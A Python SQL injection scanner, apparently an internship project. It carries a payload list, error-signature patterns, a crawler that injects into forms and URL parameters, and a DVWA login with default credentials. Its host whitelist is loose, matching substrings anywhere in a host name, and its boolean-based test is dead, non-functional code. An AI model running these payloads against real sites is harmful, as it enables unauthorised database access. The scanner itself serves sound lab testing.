#!/usr/bin/env python3
import requests
import time
import logging
import json
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Tuple, Optional
import re
import argparse

# Optional: for colored output
try:
    from colorama import init, Fore, Style
    init()
    COLORS = True
except ImportError:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = RESET = ''

# ========== CONFIGURATION ==========
REQUEST_TIMEOUT = 10
MAX_CONCURRENT_THREADS = 5
RATE_LIMIT_DELAY = 1  # seconds between requests to same domain
MAX_PARAM_VALUE_LENGTH = 100

# Allowed test targets (whitelist for ethical testing)
ALLOWED_HOSTS = [
    'localhost',
    '127.0.0.1',
    '192.168.',
    '10.0.',
    '172.16.',
    'dvwa',
    'testphp.vulnweb.com',  # Acunetix test site (permitted for education)
    'testhtml5.vulnweb.com',
]

# Common SQL Injection Payloads
SQLI_PAYLOADS = [
    # Error-based
    ("'", "SQL syntax error"),
    ("\"", "SQL syntax error"),
    ("' OR '1'='1", "bypass"),
    ("' OR 1=1 --", "bypass"),
    ("' OR 1=1#", "bypass"),
    ("' OR 1=1/*", "bypass"),
    ("' OR 'x'='x", "bypass"),
    ("' OR '1'='1' --", "bypass"),
    ("' OR '1'='1' /*", "bypass"),
    ("admin' --", "bypass"),
    ("admin'#", "bypass"),
    
    # Union-based
    ("' UNION SELECT NULL--", "union"),
    ("' UNION SELECT NULL,NULL--", "union"),
    ("' UNION SELECT NULL,NULL,NULL--", "union"),
    ("' UNION SELECT 1,2,3--", "union"),
    
    # Boolean-based blind
    ("' AND '1'='1", "true condition"),
    ("' AND '1'='2", "false condition"),
    ("' AND 1=1 --", "true condition"),
    ("' AND 1=2 --", "false condition"),
    
    # Time-based blind
    ("' OR SLEEP(5)--", "time", 5),
    ("' OR pg_sleep(5)--", "time", 5),
    ("' WAITFOR DELAY '0:0:5'--", "time", 5),
    ("' AND SLEEP(5) AND '1'='1", "time", 5),
    
    # Database-specific
    ("' AND (SELECT * FROM dual) IS NULL--", "oracle"),
    ("' AND 1=CONVERT(int, @@version)--", "mssql"),
    ("' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--", "mysql"),
]

# ========== LOGGING SETUP ==========
def setup_logging():
    """Setup logging configuration"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"sqli_scanner_{timestamp}.log"
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__), log_filename

# ========== TARGET VALIDATION ==========
def is_target_allowed(url: str) -> bool:
    """
    Check if target URL is in allowed hosts whitelist
    Ethical requirement: Only scan permitted targets
    """
    try:
        parsed = urlparse(url)
        host = parsed.netloc.lower()
        
        for allowed in ALLOWED_HOSTS:
            if host.startswith(allowed) or allowed in host:
                return True
        
        # Also check if it's a local/private IP
        if host.startswith(('127.', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.')):
            return True
            
        return False
    except:
        return False

# ========== URL PARAMETER EXTRACTION ==========
def extract_parameters(url: str) -> List[Dict]:
    """
    Extract all parameters from URL query string and form inputs
    """
    parameters = []
    parsed = urlparse(url)
    
    # Extract URL query parameters
    if parsed.query:
        query_params = parse_qs(parsed.query)
        for param, values in query_params.items():
            parameters.append({
                'type': 'url',
                'name': param,
                'value': values[0] if values else '',
                'url': url
            })
    
    return parameters

def extract_forms(html: str, base_url: str) -> List[Dict]:
    """
    Extract HTML forms from response content
    """
    forms = []
    form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
    
    for form_match in form_pattern.finditer(html):
        form_html = form_match.group(0)
        
        # Extract form attributes
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        
        action = action_match.group(1) if action_match else ''
        method = method_match.group(1).upper() if method_match else 'GET'
        
        # Extract input fields
        inputs = []
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', re.IGNORECASE)
        for input_match in input_pattern.finditer(form_html):
            name = input_match.group(1)
            inputs.append({'name': name, 'value': ''})
        
        # Extract textarea fields
        textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>', re.IGNORECASE)
        for textarea_match in textarea_pattern.finditer(form_html):
            name = textarea_match.group(1)
            inputs.append({'name': name, 'value': ''})
        
        # Full form action URL
        full_action = urljoin(base_url, action)
        
        forms.append({
            'action': full_action,
            'method': method,
            'inputs': inputs,
            'original_html': form_html[:500]  # Store preview
        })
    
    return forms

# ========== SQL INJECTION TESTING ==========
def test_error_based(url: str, param_name: str, param_value: str, payload: str, logger, session) -> Optional[Dict]:
    """
    Test for error-based SQL injection
    """
    try:
        # Prepare test URL/data
        test_value = param_value + payload if param_value else payload
        test_params = {param_name: test_value}
        
        # Rate limiting
        time.sleep(RATE_LIMIT_DELAY)
        
        # Send request
        start_time = time.time()
        response = session.get(url, params=test_params, timeout=REQUEST_TIMEOUT)
        elapsed_time = time.time() - start_time
        
        # SQL error patterns
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"valid SQLite",
            r"SQL Server.*Driver",
            r"Driver.*SQL Server",
            r"SQLServer JDBC Driver",
            r"com.microsoft.sqlserver",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            # DVWA specific patterns - ADD THESE 3
            r"you have an error in your sql syntax",
            r"mysql error",
            r"check the manual that corresponds to your mysql server",
        ]
        
        response_text = response.text.lower()
        for error_pattern in sql_errors:
            if re.search(error_pattern, response_text, re.IGNORECASE):
                return {
                    'vulnerable': True,
                    'type': 'error-based',
                    'payload': payload,
                    'evidence': f"Found pattern: {error_pattern}",
                    'response_time': elapsed_time,
                    'status_code': response.status_code
                }
        
        return {'vulnerable': False}
        
    except requests.exceptions.RequestException as e:
        logger.debug(f"Request failed: {e}")
        return {'vulnerable': False, 'error': str(e)}

def test_time_based(url: str, param_name: str, param_value: str, payload: str, expected_delay: int, logger, session) -> Optional[Dict]:
    """
    Test for time-based blind SQL injection
    """
    try:
        # Normal request to get baseline
        normal_params = {param_name: param_value}
        start_normal = time.time()
        normal_response = session.get(url, params=normal_params, timeout=REQUEST_TIMEOUT)
        normal_time = time.time() - start_normal
        
        # Test request with delay payload
        test_value = param_value + payload if param_value else payload
        test_params = {param_name: test_value}
        
        time.sleep(RATE_LIMIT_DELAY)
        
        start_test = time.time()
        test_response = session.get(url, params=test_params, timeout=REQUEST_TIMEOUT + expected_delay + 2)
        test_time = time.time() - start_test
        
        # If test took significantly longer (at least expected_delay seconds longer)
        if test_time > normal_time + expected_delay * 0.8:
            return {
                'vulnerable': True,
                'type': 'time-based blind',
                'payload': payload,
                'normal_response_time': normal_time,
                'delayed_response_time': test_time,
                'expected_delay': expected_delay
            }
        
        return {'vulnerable': False}
        
    except requests.exceptions.RequestException as e:
        logger.debug(f"Time-based test failed: {e}")
        return {'vulnerable': False}

def test_boolean_based(url: str, param_name: str, param_value: str, payload: str, logger) -> Optional[Dict]:
    """
    Test for boolean-based blind SQL injection
    """
    try:
        # Create true and false conditions
        true_payload = payload.replace('false condition', 'true condition')
        false_payload = payload.replace('true condition', 'false condition')
        
        test_value_true = param_value + true_payload if param_value else true_payload
        test_value_false = param_value + false_payload if param_value else false_payload
        
        time.sleep(RATE_LIMIT_DELAY)
        
        # Get responses for both conditions
        params_true = {param_name: test_value_true}
        params_false = {param_name: test_value_false}
        
        response_true = requests.get(url, params=params_true, timeout=REQUEST_TIMEOUT)
        response_false = requests.get(url, params=params_false, timeout=REQUEST_TIMEOUT)
        
        # If responses are significantly different (simple heuristic)
        if abs(len(response_true.text) - len(response_false.text)) > 50:
            return {
                'vulnerable': True,
                'type': 'boolean-based blind',
                'payload': payload,
                'true_response_length': len(response_true.text),
                'false_response_length': len(response_false.text)
            }
        
        return {'vulnerable': False}
        
    except requests.exceptions.RequestException as e:
        logger.debug(f"Boolean-based test failed: {e}")
        return {'vulnerable': False}

# ========== MAIN SCANNER CLASS ==========
class SQLInjectionScanner:
    def __init__(self, target_url: str, logger, max_depth: int = 2):
        self.target_url = target_url
        self.logger = logger
        self.max_depth = max_depth
        self.vulnerabilities = []
        self.visited_urls = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SQLiScanner/1.0 (Educational Tool - Syntexhub Internship)'
        })

    def login_to_dvwa(self):
        """Login to DVWA with CSRF token handling"""
        try:
            # First get the login page to extract the token
            login_page = self.session.get("http://localhost:8080/login.php", timeout=REQUEST_TIMEOUT)
            
            # Extract user_token
            import re
            token_match = re.search(r'user_token\'\s*value=\'([^\']+)\'', login_page.text)
            if not token_match:
                token_match = re.search(r'user_token"\s*value="([^"]+)"', login_page.text)
            
            user_token = token_match.group(1) if token_match else ''
            
            # Login with token
            login_data = {
                'username': 'admin',
                'password': 'password',
                'user_token': user_token,
                'Login': 'Login'
            }
            
            response = self.session.post("http://localhost:8080/login.php", data=login_data, timeout=REQUEST_TIMEOUT)
            
            # Verify login worked
            home = self.session.get("http://localhost:8080/index.php", timeout=REQUEST_TIMEOUT)
            if "logout" in home.text.lower():
                self.logger.info("Logged into DVWA successfully")
                return True
            else:
                self.logger.warning("Login may have failed")
                return False
                
        except Exception as e:
            self.logger.debug(f"Login attempt: {e}")
            return False

    def crawl(self, url: str, depth: int = 0):
        """
        Crawl the target website to find all links and forms
        """
        if depth > self.max_depth or url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        self.logger.info(f"Crawling: {url} (Depth: {depth})")
        
        try:
            time.sleep(RATE_LIMIT_DELAY)
            response = self.session.get(url, timeout=REQUEST_TIMEOUT)
            
            # Extract and test forms
            forms = extract_forms(response.text, url)
            for form in forms:
                self.scan_form(form)
            
            # Extract links for crawling
            link_pattern = re.compile(r'href=["\'](.*?)["\']', re.IGNORECASE)
            links = link_pattern.findall(response.text)
            
            for link in links:
                absolute_url = urljoin(url, link)
                if absolute_url.startswith(('http://', 'https://')):
                    parsed = urlparse(absolute_url)
                    # Stay within same domain
                    if parsed.netloc == urlparse(self.target_url).netloc:
                        self.crawl(absolute_url, depth + 1)
                        
        except Exception as e:
            self.logger.error(f"Error crawling {url}: {e}")
    
    def scan_form(self, form: Dict):
        """
        Scan a form for SQL injection vulnerabilities
        """
        self.logger.info(f"Scanning form: {form['action']} ({form['method']})")
        
        for payload, payload_type, *extra in SQLI_PAYLOADS:
            for input_field in form['inputs']:
                param_name = input_field['name']
                
                # Prepare form data
                form_data = {param_name: payload}
                for other_input in form['inputs']:
                    if other_input['name'] != param_name:
                        form_data[other_input['name']] = 'test'
                
                try:
                    time.sleep(RATE_LIMIT_DELAY)
                    
                    if form['method'] == 'POST':
                        response = self.session.post(
                            form['action'], 
                            data=form_data, 
                            timeout=REQUEST_TIMEOUT
                        )
                    else:
                        response = self.session.get(
                            form['action'], 
                            params=form_data, 
                            timeout=REQUEST_TIMEOUT
                        )
                    
                    # Check for SQL errors in response
                    response_text = response.text.lower()
                    sql_error_patterns = [
                        'sql syntax', 'mysql', 'ora-', 'postgresql', 
                        'sqlite', 'microsoft ole db', 'unclosed quotation',
                        'odbc driver', 'sql server', 'division by zero'
                    ]
                    
                    for pattern in sql_error_patterns:
                        if pattern in response_text:
                            vulnerability = {
                                'url': form['action'],
                                'method': form['method'],
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'error-based',
                                'evidence': f"Found '{pattern}' in response",
                                'timestamp': datetime.now().isoformat()
                            }
                            self.vulnerabilities.append(vulnerability)
                            self.logger.warning(f"{Fore.RED}[!] SQLi Found!{Fore.RESET} {vulnerability['url']} - Parameter: {param_name} - Payload: {payload}")
                            break
                            
                except Exception as e:
                    self.logger.debug(f"Form scan error: {e}")

    def scan_url_parameters(self):
        """
        Scan URL parameters for SQL injection vulnerabilities
        """
        self.login_to_dvwa()
        self.logger.info(f"Scanning URL parameters: {self.target_url}")
        
        # Extract parameters from URL
        parsed = urlparse(self.target_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            
            for param_name, param_values in query_params.items():
                original_value = param_values[0] if param_values else ''
                
                for payload, payload_type, *extra in SQLI_PAYLOADS:
                    expected_delay = extra[0] if payload_type == 'time' and extra else 5
                    
                    self.logger.debug(f"Testing {param_name} with payload: {payload[:50]}")
                    
                    # Test error-based
                    result = test_error_based(self.target_url, param_name, original_value, payload, self.logger, self.session)
                    if result and result.get('vulnerable'):
                        vulnerability = {
                            'url': self.target_url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'type': result['type'],
                            'evidence': result.get('evidence', ''),
                            'timestamp': datetime.now().isoformat()
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.logger.warning(f"{Fore.RED}[!] SQLi Found!{Fore.RESET} {param_name} -> {payload}")
                    
                    # Test time-based for payloads marked as 'time'
                    if payload_type == 'time':
                        result = test_time_based(self.target_url, param_name, original_value, payload, expected_delay, self.logger, self.session)
                        if result and result.get('vulnerable'):
                            vulnerability = {
                                'url': self.target_url,
                                'method': 'GET',
                                'parameter': param_name,
                                'payload': payload,
                                'type': result['type'],
                                'evidence': f"Delayed {result['delayed_response_time']:.2f}s vs normal {result['normal_response_time']:.2f}s",
                                'timestamp': datetime.now().isoformat()
                            }
                            self.vulnerabilities.append(vulnerability)
                            self.logger.warning(f"{Fore.RED}[!] Time-based SQLi Found!{Fore.RESET} {param_name}")
    
    def generate_report(self, output_file: str = None):
        """
        Generate JSON report of all findings
        """
        report = {
            'scan_target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'urls_scanned': list(self.visited_urls),
            'summary': {
                'error_based': len([v for v in self.vulnerabilities if 'error' in v['type']]),
                'time_based': len([v for v in self.vulnerabilities if 'time' in v['type']]),
                'boolean_based': len([v for v in self.vulnerabilities if 'boolean' in v['type']])
            }
        }
        
        # Save to file
        if output_file is None:
            output_file = f"sqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"{Fore.GREEN}[+] Report saved to: {output_file}{Fore.RESET}")
        
        # Print summary
        self.print_summary()
        
        return report
    
    def print_summary(self):
        """
        Print colored summary to console
        """
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}SQL INJECTION SCAN SUMMARY{Fore.RESET}")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"URLs Crawled: {len(self.visited_urls)}")
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"\n{Fore.YELLOW}Breakdown by Type:{Fore.RESET}")
        print(f"  - Error-based: {len([v for v in self.vulnerabilities if 'error' in v['type']])}")
        print(f"  - Time-based: {len([v for v in self.vulnerabilities if 'time' in v['type']])}")
        print(f"  - Boolean-based: {len([v for v in self.vulnerabilities if 'boolean' in v['type']])}")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}Vulnerable Endpoints:{Fore.RESET}")
            for v in self.vulnerabilities[:10]:  # Show first 10
                print(f"  • {v['url']} - {v['parameter']} ({v['type']})")
        
        print(f"{'='*60}\n")

# ========== MAIN EXECUTION ==========
def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Scanner - Syntexhub Cybersecurity Internship Project',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqli_scanner.py -u "http://localhost/dvwa/vulnerabilities/sqli/"
  python sqli_scanner.py -u "http://testphp.vulnweb.com/artists.php" --crawl
  python sqli_scanner.py -u "http://127.0.0.1/test.php?id=1" --threads 3 --no-crawl
        """
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('--crawl', action='store_true', help='Enable crawling (find and test forms)')
    parser.add_argument('--depth', type=int, default=1, help='Crawling depth (default: 1)')
    parser.add_argument('--threads', type=int, default=MAX_CONCURRENT_THREADS, help=f'Concurrent threads (default: {MAX_CONCURRENT_THREADS})')
    parser.add_argument('--no-crawl', action='store_true', help='Disable crawling, only scan given URL')
    parser.add_argument('-o', '--output', help='Output report filename (JSON)')
    
    args = parser.parse_args()
    
    # Validate target
    if not is_target_allowed(args.url):
        print(f"{Fore.RED}[ERROR] Target not in allowed whitelist!{Fore.RESET}")
        print(f"Allowed hosts: {', '.join(ALLOWED_HOSTS[:5])}...")
        print("\nEthical reminder: Only scan targets you have permission to test.")
        sys.exit(1)
    
    # Setup logging
    logger, log_file = setup_logging()
    logger.info(f"Starting SQL Injection Scanner")
    logger.info(f"Target: {args.url}")
    logger.info(f"Log file: {log_file}")
    
    # Display banner
    print(f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════╗
║                 SQL INJECTION SCANNER                    ║
╚══════════════════════════════════════════════════════════╝
{Fore.RESET}
    """)
    
    # Initialize scanner
    scanner = SQLInjectionScanner(args.url, logger, max_depth=args.depth)
    
    # Run scans
    print(f"{Fore.YELLOW}[*] Scanning URL parameters...{Fore.RESET}")
    scanner.scan_url_parameters()
    
    if args.crawl and not args.no_crawl:
        print(f"{Fore.YELLOW}[*] Crawling website (depth: {args.depth})...{Fore.RESET}")
        scanner.crawl(args.url)
    
    # Generate report
    report = scanner.generate_report(args.output)
    
    print(f"{Fore.GREEN}[+] Scan completed successfully!{Fore.RESET}")
    print(f"[+] Log saved to: {log_file}")
    
    if scanner.vulnerabilities:
        print(f"{Fore.RED}[!] WARNING: SQL Injection vulnerabilities detected!{Fore.RESET}")
        sys.exit(1)
    else:
        print(f"{Fore.GREEN}[✓] No SQL Injection vulnerabilities detected.{Fore.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()